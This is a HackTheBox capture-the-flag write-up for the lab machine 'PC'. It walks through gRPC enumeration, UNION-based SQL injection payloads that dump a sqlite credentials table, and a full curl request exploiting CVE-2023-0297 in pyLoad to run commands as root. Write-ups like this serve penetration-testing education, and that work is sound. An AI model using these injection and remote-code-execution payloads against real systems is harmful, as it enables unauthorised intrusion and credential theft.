# [PC](https://app.hackthebox.com/machines/PC) - 05/06/2023 - HackTheBox write-up

## User flag

### Discovery

After a first `nmap` we only found a SSH server and nothing more. So we can try a more aggressive ports scan :
```bash
$ nmap -p0-65535 10.10.11.214 -Pn        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 12:46 CEST
Nmap scan report for 10.10.11.214
Host is up (0.016s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 153.83 seconds
```

This port is usually associated with gRPC service, so we can try to connect with gRPC.

First we need a tool, we can find `grpcurl` a CLI interface [here](https://github.com/fullstorydev/grpcurl).

Then we can try this tool:
```bash
$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

It works, and we find an application: `SimpleApp`. Now we can list the services :
```bash
$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

So, we have 3 services, `RegisterUser` to register, `LoginUser` to login and `getInfo` to get informations.

We can create users, connect with them and also connect with `admin:admin` credentials. Each connection give us an `id` and a token. We can use this informations with the service `getInfo` but it gives us always the same response :
```bash
$ grpcurl -plaintext -v -d '{"id": "503"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODU5ODMwNjl9.Pqx6-jL86yY6ZL1OSWxx-ORMNwaDy26sSDGTvCcI0rA' 10.10.11.214:50051 SimpleApp.getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODU5ODMwNjl9.Pqx6-jL86yY6ZL1OSWxx-ORMNwaDy26sSDGTvCcI0rA

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Will update soon."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

### Searching for vulnerability

We cannot found more informations by using the services as expected, so we need to find a vulnerability, probably an injection.

After researches we can found an error when submitting the following request:
```bash
$ grpcurl -plaintext -d '{"id": "50; test"}' -H "token: $token" 10.10.11.214:50051 SimpleApp.getInfo 
ERROR:
  Code: Unknown
  Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
```

There is a `sqlite3.Warning` exception so this parameter is vulnerable to a numeric SQL injection.

### Exploitation

So, now we can exploit it to retrieve the name of the tables:
```
Request:
{
    "id": "1 union SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -"
}
Response:
{
  "message": "accounts"
}
```
Then the columns:
```
Request:
{
  "id": "1 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts' -- -"
}
Response:
{
    "message":
        "CREATE TABLE \"accounts\" (
            username TEXT UNIQUE,
            password TEXT
        )"
}
```
And finally the usernames and passwords:
```
Request:
{
    "id": "1 union SELECT username/password FROM accounts LIMIT $N,$N+1"
}
```

With this we can find two credentials:
```
sau:HereIsYourPassWord1431
admin:admin
```

To obtain the user flag we can now reuse the username `sau` with his password to connect to the server with SSH.

## Root flag

### Searching for elevating privileges

First, we can just run `linpeas` and hope it will find the vulnerability we need to exploit.

I doesn't find it immediately, I was searching for CVE or SUID programs first, but there is nothing exploitable.

So, I've started to search for specific tools, scripts or programs run as `root` and I find this:
```bash
$ ps -elf | grep root
[...]
4 S root    1048    1  0  80   0 - 301896 -     11:15 ?     00:00:01 /usr/bin/python3 /usr/local/bin/pyload
```

The system use `pyload` (a download manager in Python) and it runs as `root`.

Quickly by searching `pyLoad CVE` we can find the CVE-2023-0297, a RCE without authentication, so it's probably that.

### Exploitation

A POC is available [here](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad). We just need to find the port where `pyLoad` is running. There is only one unknown port who is listening so it must be that (port `9666`).

So we just need to use the exploit of the POC and get the flag:
```bash
# cat /root/root.txt > /tmp/pwned
sau@pc:~$ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"cat%20%2Froot%2Froot.txt%20%3E%20%2Ftmp%2Fpwned\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:9666/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Tue, 06 Jun 2023 11:46:29 GMT
Server: Cheroot/8.6.0

Could not decrypt key
sau@pc:~$ cat /tmp/pwned
d37b90d7445383cec8bf802fa0153704
```
